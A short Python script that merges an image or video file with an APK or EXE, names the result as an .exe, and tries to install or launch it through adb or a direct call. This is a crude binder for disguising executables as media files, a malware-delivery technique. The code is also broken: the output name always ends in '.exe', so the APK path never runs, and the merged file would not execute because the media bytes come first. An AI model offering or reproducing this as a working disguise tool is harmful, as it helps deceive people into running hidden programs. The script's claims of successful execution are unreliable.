import shutil
import subprocess
import platform

# Prompt the user to upload a JPG/PNG/MP4/GIF file from their local storage
host_file = input("Please upload a JPG/PNG/MP4/GIF file from your local storage: ")
with open(host_file, "rb") as f:
    host_content = f.read()

# Prompt the user to upload an APK/EXE file from their local storage
guest_file = input("Please upload an APK/EXE file from your local storage: ")
with open(guest_file, "rb") as f:
    guest_content_bytes = f.read()

# Generate the merged file name
merged_file_name = host_file.split(".")[0] + "_" + guest_file.split(".")[0] + ".exe"

# Merge the guest file into the host file
with open(merged_file_name, "wb") as f:
    f.write(host_content)
    f.write(guest_content_bytes)

# Check if the result file is an APK file and the device is Android
if ".apk" in merged_file_name and platform.system() == "Android":
    # Attempt to install and run the APK file on Android
    try:
        subprocess.run(["adb", "install", merged_file_name])
        subprocess.run(["adb", "shell", "am start -n com.example.app/.MainActivity"])
        print("APK file installed and running successfully.")
    except:
        print("Backstage null 002")
else:
    # Check if the result file is an EXE file and the device is Windows
    if ".exe" in merged_file_name and platform.system() == "Windows":
        try:
            subprocess.run([merged_file_name])
            print("EXE file running successfully.")
        except:
            print("Tiny error message: Backstage null 001")
    else:
        print("Backstage null 002")
